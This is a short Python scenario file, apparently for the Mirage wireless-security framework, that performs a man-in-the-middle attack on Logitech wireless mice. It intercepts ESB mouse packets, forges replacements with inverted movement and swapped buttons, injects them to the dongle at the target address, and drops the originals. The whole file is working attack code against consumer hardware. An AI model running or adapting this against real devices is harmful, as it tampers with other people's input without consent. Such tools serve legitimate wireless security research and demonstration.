from mirage.core import scenario
from mirage.libs import io,esb,utils,wireless

class logitech_invert_mouse_mitm(scenario.Scenario):
	# When the module starts...
	def onStart(self):
		self.dongleEmitter = self.module.dongleEmitter
		self.dongleReceiver = self.module.dongleReceiver
		self.deviceEmitter = self.module.deviceEmitter
		self.deviceReceiver = self.module.deviceReceiver

	# When a Logitech mouse packet is received...
	def onLogitechMousePacket(self,pkt):
		# Invert mouse button
		if pkt.buttonMask != 0x00:
			if pkt.buttonMask == 0x01:
				invertedButton = 0x02
			else:
				invertedButton = 0x01
		else:
			invertedButton = 0x00
		# Transmit packet
		new = esb.ESBLogitechMousePacket(address=self.module.args["TARGET"],x=-pkt.x, y=-pkt.y, buttonMask = invertedButton)
		self.dongleEmitter.sendp(new)

		# Prevent default behaviour
		return False
